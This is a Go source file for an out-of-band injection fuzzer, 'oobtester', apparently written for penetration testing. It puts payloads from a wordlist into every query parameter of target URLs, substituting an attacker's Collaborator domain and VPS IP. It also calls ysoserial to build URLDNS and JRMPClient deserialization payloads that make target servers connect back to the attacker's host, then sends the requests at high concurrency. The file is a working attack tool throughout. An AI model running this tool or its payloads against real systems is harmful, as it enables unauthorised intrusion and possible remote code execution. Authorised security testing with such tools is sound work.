// Created by Karmaz95
//
// .\oobtester.exe
//	-p "payloads.txt"
//	-u "urls.txt"
//	-d "domain.collab.burp.net"
//	-i "127.127.127.127"
//	-o "log.txt"
//	-h "Cookie: asd=123; qwe=321;"
//	-h "Custom2: headervalue123"
//  -y "/path/to/ysoserial.jar"
//
// To do: 
//	[+] Add POST requests

package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
	"os/exec"
	b64 "encoding/base64"
	"sync"
	"runtime"
)

// readLines reads a whole file into memory
// and returns a slice of its lines.
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// writeLines writes the lines to the given file.
func writeLines(lines []string, path string) error {
	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	w := bufio.NewWriter(file)
	for _, line := range lines {
		fmt.Fprintln(w, line)
	}
	return w.Flush()
}

// define your own flag.Value and use flag.Var() for binding it ---
type arrayFlags []string

func (i *arrayFlags) String() string {
	return "my string representation"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
} // ---

var headers arrayFlags

func main() {
	// 1. Flags declaration ---
	//concurrency := flag.Int("t", 10, "Set the threads (concurrency) for greater speeds")
	vps_ip := flag.String("i", "", "Value for [vps_ip] placeholder used inside the payload wordlist")
	ysoserial_path := flag.String("y", "", "Path to ysoserial.jar")
	domain_collab := flag.String("d", "", "Value for [domain_collab] placeholder used inside the payload wordlist")
	flag.Var(&headers, "h", "Custom header (can be used multiple times)") // declared above main
	urls_list_path := flag.String("u", "", "List with urls to attack - example line: http://example.com?a=1&b=2")
	payloads_list_path := flag.String("p", "", "Payload wordlist with placeholders - example line: payload123//domain_collab../../")
	output_file := flag.String("o", "", "Log filename")
	flag.Parse()
	flagset := make(map[string]bool)                          // *** if header is set below [6]
	flag.Visit(func(f *flag.Flag) { flagset[f.Name] = true }) // *** if header is set below [6]
	// ---

	// 2. Load payload_list into array
	payloads_list, err := readLines(*payloads_list_path)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}

	// 3. Replace placeholders in the payload_list and store the payloads in []payloads{}
	payloads := []string{}
	for i := range payloads_list {
		if strings.Contains(payloads_list[i], "domain_collab") {
			payloads = append(payloads, strings.Replace(payloads_list[i], "domain_collab", *domain_collab, -1))
		} else {
			payloads = append(payloads, strings.Replace(payloads_list[i], "vps_ip", *vps_ip, -1))
		}
	}

	if flagset["y"] {
		// 3.1. Generate ysoserial URLDNS payload and add them to []payloads{}
		output, err := exec.Command("java", "-jar", *ysoserial_path, "URLDNS", "http://deser."+*domain_collab).CombinedOutput()
		if err != nil {
		  os.Stderr.WriteString(err.Error())
		}
		uEnc := b64.URLEncoding.EncodeToString([]byte(output))
	   	payloads = append(payloads,uEnc)

	   	sEnc := b64.StdEncoding.EncodeToString([]byte(output))
    	payloads = append(payloads,sEnc)

	   	// 3.2. Generate ysoserial JRMPClient payload and add them to []payloads{}
		output, err = exec.Command("java", "-jar", *ysoserial_path, "JRMPClient", *vps_ip+":80").CombinedOutput()
		if err != nil {
		  os.Stderr.WriteString(err.Error())
		}
		uEnc = b64.URLEncoding.EncodeToString([]byte(output))
	   	payloads = append(payloads,uEnc)
	   	
	   	sEnc = b64.StdEncoding.EncodeToString([]byte(output))
    	payloads = append(payloads,sEnc)
		}

	// 4. Load urls_list into array
	urls_list, err := readLines(*urls_list_path)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}

	// 5. Generate test cases => Replace parameter values with payloads
	test_cases := []string{}
	for url_id := range urls_list {
		u, _ := url.Parse(urls_list[url_id]) // make loop - all urls here
		values, _ := url.ParseQuery(u.RawQuery)
		for key := range values {
			// I have no idea waht I am doing ...
			u, _ := url.Parse(urls_list[url_id])
			values, _ := url.ParseQuery(u.RawQuery)
			// ^ above section probably could be better coded, but it works for me - reset all values for every key iteration.
			for payload_id := range payloads {
				values.Set(key, payloads[payload_id])
				u.RawQuery = values.Encode()
				test_cases = append(test_cases, u.String())
			}
		}
	}

	// 6. Start the attack => Send the GET requests with test cases and LOG all sent requests:
	logs := []string{}
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.MaxIdleConns = 10
	t.IdleConnTimeout = 1 * time.Second
	t.MaxConnsPerHost = 100
	t.MaxIdleConnsPerHost = 100
	t.DisableCompression = true
	client := &http.Client{
		Timeout: 1 * time.Second,
		Transport: t,
	}
	
	var wg sync.WaitGroup
	for i, test_case := range test_cases {

		req, _ := http.NewRequest("GET", test_case, nil)
		if flagset["h"] {
			for _, header := range headers {
				s := strings.Split(header, ":")
				req.Header.Set(s[0], s[1])
			}

		}
		wg.Add(1)
		if runtime.NumGoroutine() > 300 {
			time.Sleep(1 *time.Second / 2)
			//fmt.Println(runtime.NumGoroutine())
		}
		go func () {	
			defer wg.Done()
			client.Do(req)
		}()
		fmt.Println("[ID]:" + fmt.Sprint(i+1) + ":[TIME]:" + time.Now().Format(time.ANSIC) + ":[URL]:" + test_case)
		logs = append(logs, ("[ID]:" + fmt.Sprint(i+1) + ":[TIME]:" + time.Now().Format(time.ANSIC) + ":[URL]:" + test_case))
	}
	wg.Wait()
	// 7. Save the logs in a file:
	if err := writeLines(logs, *output_file); err != nil {
		log.Fatalf("writeLines: %s", err)
	}
}